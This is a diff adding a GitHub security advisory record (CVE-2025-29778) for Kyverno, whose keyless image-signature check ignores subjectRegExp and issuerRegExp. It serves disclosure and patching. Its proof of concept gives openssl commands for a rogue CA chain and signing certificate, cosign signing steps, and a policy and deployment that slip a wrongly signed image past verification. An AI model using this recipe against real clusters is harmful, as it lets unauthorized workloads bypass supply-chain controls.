@@ -1,0 +1,65 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2025-05-08T14:51:57Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/kyverno/kyverno"
+  },
+  "Advisory": {
+    "DatabaseId": 286027,
+    "Id": "GSA_kwCzR0hTQS00Nm1wLTh3MzItNmc5NM4ABF1L",
+    "GhsaId": "GHSA-46mp-8w32-6g94",
+    "References": [
+      {
+        "Url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-46mp-8w32-6g94"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-29778"
+      },
+      {
+        "Url": "https://github.com/kyverno/policies/issues/1246"
+      },
+      {
+        "Url": "https://github.com/kyverno/kyverno/pull/12237"
+      },
+      {
+        "Url": "https://github.com/kyverno/kyverno/commit/8777672fb17bdf252bd2e7d8de3441e240404a60"
+      },
+      {
+        "Url": "https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-46mp-8w32-6g94"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-46mp-8w32-6g94"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-29778"
+      }
+    ],
+    "Description": "### Summary\nKyverno ignores subjectRegExp and IssuerRegExp while verifying artifact's sign with keyless mode. It allows the attacker to deploy kubernetes resources with the artifacts that were signed by unexpected certificate.\n\n### Details\nKyverno checks only subject and issuer fields when verifying an artifact's signature: https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537. While there are subjectRegExp and issuerRegExp fields that can also be used for the defining expected subject and issue values. If the last ones are used then their values are not taken in count and there is no actually restriction for the certificate that was used for the image sign.\n\n\n### PoC\n\nFor the successful exploitation attacker needs:\n- Private key of any certificate in the certificate chain that trusted by cosign. It can be certificate that signed by company's self-signed Root CA if they are using their own PKI.\n- Access to container registry to push artifacts images \n- Availability to deploy malicious artifacts to the kubernetes cluster\n\n1. Generate certificate that will be used for the image signing with the oidcissuer url. That can be done with the Fulcio or manually by using openssl\n\n```\n# Create self-signed RootCA\nopenssl req -x509 -newkey rsa:4096 -keyout root-ca-key.pem -sha256 -noenc -days 9999 -subj \"/C=AA/L=Location/O=IT/OU=Security/CN=Root Certificate Authority\" -out root-ca.pem\n\n\n# Create request for the intermediate certificate\nopenssl req -noenc -newkey rsa:4096 -keyout intermediate-ca-key.pem -addext \"subjectKeyIdentifier = hash\" -addext \"keyUsage = critical,keyCertSign\" -addext \"basicConstraints = critical,CA:TRUE,pathlen:2\" -subj \"/C=AA/L=Location/O=IT/OU=Security/CN=Intermediate Certificate Authority\" -out intermediate-ca.csr\n\n# Issue intermediate cert with RootCA\nopenssl x509 -req -days 9999 -sha256 -in intermediate-ca.csr -CA root-ca.pem -CAkey root-ca-key.pem -copy_extensions copy -out intermediate-ca.pem\n\n# OID_1_1 is the hexadecimal representation of the oidcissuer url\nOID_1_1=$(echo -n \"https://me.net\" | xxd -p -u)\n\n# Create request for the leaf certificate\nopenssl req -noenc -newkey rsa:4096 -keyout my-key.pem -addext \"subjectKeyIdentifier = hash\" -addext \"basicConstraints = critical,CA:FALSE\" -addext \"keyUsage = critical,digitalSignature\" -addext \"subjectAltName = email:me@me.net\" -addext \"1.3.6.1.4.1.57264.1.1 = DER:${OID_1_1}\" -addext \"1.3.6.1.4.1.57264.1.8 = ASN1:UTF8String:https://me.net\" -subj \"/C=AA/L=Location/O=IT/OU=Security/CN=My Cosign Certificate\" -out my-cert.csr\n\n# Issue leaf cert with Intermediate CA\nopenssl x509 -req -in my-cert.csr -CA intermediate-ca.pem -CAkey intermediate-ca-key.pem -copy_extensions copy -days 9999 -sha256 -out my-cert.pem\n\n# Generate certificates chain\ncat intermediate-ca.pem root-ca.pem \u003e cert-chain.pem\n```\n\n2. Build and push container image\n2. Import key and sign the image with the generated certificate\n```\nCOSIGN_PASSWORD=\"\" cosign import-key-pair --key my-key.pem --output-key-prefix=import-my-key\nCOSIGN_PASSWORD=\"\" cosign sign $IMAGE_WITH_HASH --tlog-upload=false --cert my-cert.pem --cert-chain cert-chain.pem --key import-my-key.key\n```\n\n3. Add ClusterPolicy for the Kyverno with the wrong subject and issuer regexp. Adding (Fulcio) Root CA as secret and using it in policy is optional only if cosign cannot trust it:\n```\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: check-image-keyless\nspec:\n  validationFailureAction: Enforce\n  webhookTimeoutSeconds: 30\n  rules:\n    - name: check-image-keyless\n      match:\n        any:\n        - resources:\n            kinds:\n              - Pod\n      context:\n        - name: encodedCert\n          apiCall:\n            urlPath: \"/api/v1/namespaces/kyverno/secrets/fulcio-ca\"\n            method: GET\n            jmesPath: \"data.\\\"fulcio-ca.pem\\\"\"\n        - name: root\n          variable:\n            jmesPath: \"base64_decode(encodedCert)\"\n      verifyImages:\n      - imageReferences:\n        - \"\u003cIMAGE_REGEXP\u003e\"\n        attestors:\n        - entries:\n          - keyless:\n              subjectRegExp: https://ivalid\n              issuerRegExp: https://ivalid\n              roots: \"{{root}}\"\n              rekor:\n                url: \u003cURL_TO_REKOR\u003e\n                pubkey: |-\n                  -----BEGIN PUBLIC KEY-----\n                  ...\n                  -----END PUBLIC KEY-----\n              ctlog:\n                pubkey: |-\n                  -----BEGIN PUBLIC KEY-----\n                  ...\n                  -----END PUBLIC KEY-----\n```\n\n4. Deploy previously signed image\n```\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: image-sign\n  name: image-sign\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: image-sign\n  strategy: {}\n  template:\n    metadata:\n      annotations:\n      labels:\n        app: image-sign\n    spec:\n      containers:\n        - image: \u003cYOUR_IMAGE\u003e\n          imagePullPolicy: Always\n          name: image-signing\n          ports:\n            - containerPort: 5000\n          resources:\n            requests:\n              memory: 500Mi\n              cpu: 0.1\n            limits:\n              memory: 2Gi\n              cpu: 0.2\n      restartPolicy: Always\nstatus: {}\n```\n\n5. The deployment with pods will be create successfully due to not checking subjectRegExp and issuerRegExp fields validation\n\n### Impact\nDeploying unauthorized kubernetes resources that can lead to full compromise of kubernetes cluster\n\n### P.S.\nProblem was discovered by me when testing image sign verifying with keyless signing: \nhttps://kubernetes.slack.com/archives/CLGR9BJU9/p1740136401365279?thread_ts=1740136401.365279\u0026cid=CLGR9BJU9. Then it was [verified](https://github.com/kyverno/policies/issues/1246) and [fixed](https://github.com/kyverno/kyverno/pull/12237) by [Mohcode](https://github.com/Mohdcode). But i think it should be registered as security problem such as it allows to bypass part of the verification mechanism and Kyverno users should be aware of it.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-03-24T19:07:28Z",
+    "Severity": "MODERATE",
+    "Summary": "Kyverno ignores subjectRegExp and IssuerRegExp",
+    "UpdatedAt": "2025-05-08T14:51:57Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.14.0-alpha.1"
+      },
+      "VulnerableVersionRange": "\u003e= 1.13.0, \u003c 1.13.5"
+    }
+  ]
+}
